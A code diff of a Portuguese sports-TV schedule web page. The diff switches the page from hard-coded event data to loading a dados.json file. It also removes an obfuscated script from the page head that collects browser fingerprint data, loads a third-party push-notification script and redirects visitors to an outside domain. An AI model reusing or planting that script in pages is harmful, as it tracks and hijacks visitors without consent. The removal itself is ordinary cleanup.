@@ -1,23 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-<script>
-    var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
-    var s = document.createElement('script');
-    s.src='//im-pd.com/15f/df9ca/mw.min.js?z=11042772'+'&sw=/sw-check-permissions-51c71.js';
-    s.onload = function(result) {
-        switch (result) {
-            case 'onPermissionDefault':break;
-            case 'onPermissionAllowed':
-            Replace("//rm358.com/4/11042822");break;
-            case 'onPermissionDenied':break;
-            case 'onAlreadySubscribed':break;
-            case 'onNotificationUnsupported':break;
-        }
-    };
-    document.head.appendChild(s);
-</script>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 <meta name="pushsdk" content="2716e49fa710d28a15348094a3a9d058">
@@ -470,7 +453,7 @@ tr:hover {
     </div>
 </main>
 
-<!-- PÁGINA DE PRIVACIDADE -->
+<!-- PÁGINAS (Privacidade, Termos, Contato) -->
 <div id="privacyPage" style="display:none;">
     <div class="content-page">
         <div class="content-card">
@@ -486,7 +469,6 @@ tr:hover {
     </div>
 </div>
 
-<!-- PÁGINA DE TERMOS -->
 <div id="termsPage" style="display:none;">
     <div class="content-page">
         <div class="content-card">
@@ -500,7 +482,6 @@ tr:hover {
     </div>
 </div>
 
-<!-- PÁGINA DE CONTATO -->
 <div id="contactPage" style="display:none;">
     <div class="content-page">
         <div class="content-card">
@@ -535,58 +516,39 @@ tr:hover {
 </footer>
 
 <script>
-// Dados completos da programação esportiva (baseado no seu arquivo dados.json)
-const DADOS_COMPLETOS = {
+// DADOS DE FALBACK (usados apenas se o JSON não carregar)
+const DADOS_FALLBACK = {
   "eventos": [
-    {"hora":"10h35","esporte":"Ciclismo","jogo":"La Vuelta (Fem.) - etapa 3","canais":["ESPN3"]},
-    {"hora":"12h00","esporte":"Libertadores Fut. Areia","jogo":"Ceilândia x Tito Drago-PER","canais":["SPORTV2","YouTube"]},
-    {"hora":"13h00","esporte":"Mundial T. Mesa Equipes","jogo":"Brasil F x Luxemburgo F","canais":["SPORTV3","CazéTV"]},
-    {"hora":"13h00","esporte":"Euroliga - Playoffs","jogo":"Hapoel Tel-Aviv x Real Madrid","canais":["XSPORTS"]},
-    {"hora":"14h30","esporte":"Copa da Turquia","jogo":"Besiktas x Konyaspor","canais":["Jovem Pan","YouTube"]},
-    {"hora":"15h00","esporte":"Camp. Saudita","jogo":"Al Khaleej x Al Hilal","canais":["YouTube"]},
-    {"hora":"15h30","esporte":"Mundial T. Mesa Equipes","jogo":"Singapura x Brasil","canais":["SPORTV3","CazéTV"]},
-    {"hora":"15h45","esporte":"Liga Europa Hand.","jogo":"Porto x Melsungen-ALE","canais":["XSPORTS"]},
-    {"hora":"16h00","esporte":"Champions League","jogo":"Arsenal x Atl. Madrid","canais":["SBT","TNT","HBO Max"]},
-    {"hora":"16h00","esporte":"Brasileirão sub20 Fem.","jogo":"São Paulo F x Ferroviária F","canais":["SPORTV"]},
-    {"hora":"16h00","esporte":"Libertadores Fut. Areia","jogo":"Sampaio Corrêa x Dep. Salud-BOL","canais":["SPORTV2","YouTube"]},
-    {"hora":"18h00","esporte":"Brasileirão sub20 Fem.","jogo":"Flamengo F x Internacional F","canais":["SPORTV2"]},
-    {"hora":"18h30","esporte":"Copa do Brasil Futsal","jogo":"Vasco x Minas","canais":["YouTube"]},
-    {"hora":"19h00","esporte":"NBB - Playoffs","jogo":"Franca x Mogi","canais":["XSPORTS","YouTube"]},
-    {"hora":"19h00","esporte":"Libertadores","jogo":"Sporting Cristal x Palmeiras","canais":["Paramount+"]},
-    {"hora":"19h00","esporte":"Libertadores","jogo":"Rosario Central x Libertad","canais":["Paramount+"]},
-    {"hora":"19h00","esporte":"Sul-Americana","jogo":"Juventud-URU x Atlético-MG","canais":["ESPN"]},
-    {"hora":"19h00","esporte":"Sul-Americana","jogo":"Deportivo Riestra x Grêmio","canais":["Paramount+"]},
-    {"hora":"19h00","esporte":"Sul-Americana","jogo":"Indep. Petrolero-BOL x Caracas","canais":["Paramount+"]},
-    {"hora":"20h00","esporte":"Libertadores Fut. Areia","jogo":"Vasco x Guaicuacu-VEN","canais":["SPORTV","YouTube"]},
-    {"hora":"20h00","esporte":"NBA - Playoffs","jogo":"Detroit Pistons x Cleveland Cavaliers","canais":["Prime Video"]},
-    {"hora":"20h30","esporte":"NBB - Playoffs","jogo":"Brasília x Flamengo","canais":["SPORTV2"]},
-    {"hora":"21h00","esporte":"LNF Silver Futsal","jogo":"Concórdia x Joaçaba","canais":["XSPORTS","LNF TV"]},
-    {"hora":"21h00","esporte":"NHL - Playoffs","jogo":"Colorado Avalanche x Minnesota Wild","canais":["ESPN2"]},
-    {"hora":"21h00","esporte":"Libertadores","jogo":"Barcelona-EQU x Boca Juniors","canais":["Paramount+"]},
-    {"hora":"21h00","esporte":"Libertadores","jogo":"Univ. Central-VEN x Ind. del Valle","canais":["ESPN4"]},
-    {"hora":"21h30","esporte":"Sul-Americana","jogo":"Recoleta-PAR x Santos","canais":["SBT","ESPN"]},
-    {"hora":"21h30","esporte":"Sul-Americana","jogo":"Puerto Cabello x Cienciano-PER","canais":["ESPN3"]},
-    {"hora":"21h30","esporte":"Libertadores","jogo":"Always Ready x Lanús","canais":["Paramount+"]},
-    {"hora":"21h30","esporte":"NBA - Playoffs","jogo":"OKC Thunder x LA Lakers","canais":["Prime Video"]},
-    {"hora":"22h30","esporte":"Concacaf Champions","jogo":"Tigres x Nashville","canais":["Disney+"]},
-    {"hora":"23h00","esporte":"Sul-Americana","jogo":"Dep Cuenca-EQU x San Lorenzo","canais":["ESPN4"]}
+    {"hora":"16:00","esporte":"Futebol","jogo":"Flamengo vs Corinthians","canais":["SPORTV","Globo"]},
+    {"hora":"18:30","esporte":"Futebol","jogo":"Internacional vs Grêmio","canais":["Globo","Premiere"]}
   ]
 };
 
-// Função principal para carregar e exibir a tabela
-function carregarTabela() {
+// Função principal - CARREGA O JSON DA RAIZ
+async function carregarTabela() {
     const loading = document.getElementById('loadingTabela');
     const waitingMsg = document.getElementById('waitingMessage');
     const tabela = document.getElementById('programacaoTable');
     const tbody = document.getElementById('tabelaBody');
     
     try {
-        const dados = DADOS_COMPLETOS;
+        // Tenta carregar o arquivo dados.json da raiz com cache busting
+        const url = 'dados.json?t=' + new Date().getTime();
+        console.log('Tentando carregar:', url);
         
-        if (!dados.eventos || dados.eventos.length === 0) {
-            throw new Error('Nenhum evento encontrado');
+        const resposta = await fetch(url);
+        
+        if (!resposta.ok) {
+            throw new Error(`HTTP ${resposta.status} - Arquivo não encontrado`);
         }
         
+        const dados = await resposta.json();
+        
+        if (!dados.eventos || dados.eventos.length === 0) {
+            throw new Error('Nenhum evento encontrado no JSON');
+        }
+        
+        // Monta a tabela com os dados do JSON
         tbody.innerHTML = '';
         dados.eventos.forEach(evento => {
             const tr = document.createElement('tr');
@@ -609,12 +571,40 @@ function carregarTabela() {
         atualizarContador();
         enableSearch(true);
         
+        console.log('✅ JSON carregado com sucesso! Total de eventos:', dados.eventos.length);
+        
     } catch (erro) {
-        console.error('Erro ao carregar:', erro);
+        console.error('Erro ao carregar dados.json:', erro);
+        
+        // Usa dados de fallback apenas para não deixar a tabela vazia
+        tbody.innerHTML = '';
+        DADOS_FALLBACK.eventos.forEach(evento => {
+            const tr = document.createElement('tr');
+            const canaisStr = Array.isArray(evento.canais) ? evento.canais.join(', ') : evento.canais;
+            tr.innerHTML = `
+                <td>${evento.hora}</td>
+                <td>${evento.esporte}</td>
+                <td>${evento.jogo}</td>
+                <td>${canaisStr}</td>
+            `;
+            tbody.appendChild(tr);
+        });
+        
         loading.style.display = 'none';
-        waitingMsg.style.display = 'block';
-        tabela.style.display = 'none';
-        enableSearch(false);
+        tabela.style.display = 'table';
+        
+        formatarCanais();
+        adicionarIcones();
+        atualizarContador();
+        enableSearch(true);
+        
+        // Exibe aviso para o administrador
+        const aviso = document.createElement('div');
+        aviso.style.cssText = 'background:#ff4444; color:white; padding:10px; border-radius:8px; margin:10px auto; max-width:500px; text-align:center; font-size:12px;';
+        aviso.innerHTML = '⚠️ AVISO: O arquivo dados.json não foi encontrado. Usando dados de fallback. Certifique-se que o arquivo está na raiz do site.';
+        document.querySelector('.tabela-container').insertBefore(aviso, document.querySelector('.btn-copiar'));
+        
+        setTimeout(() => aviso.remove(), 8000);
     }
 }
 
@@ -691,7 +681,6 @@ function enableSearch(ativo) {
     buscaAtiva = ativo;
     if (!ativo) {
         searchInput.disabled = true;
-        searchInput.value = '';
         searchInput.placeholder = '🔍 Aguardando programação...';
     } else {
         searchInput.disabled = false;
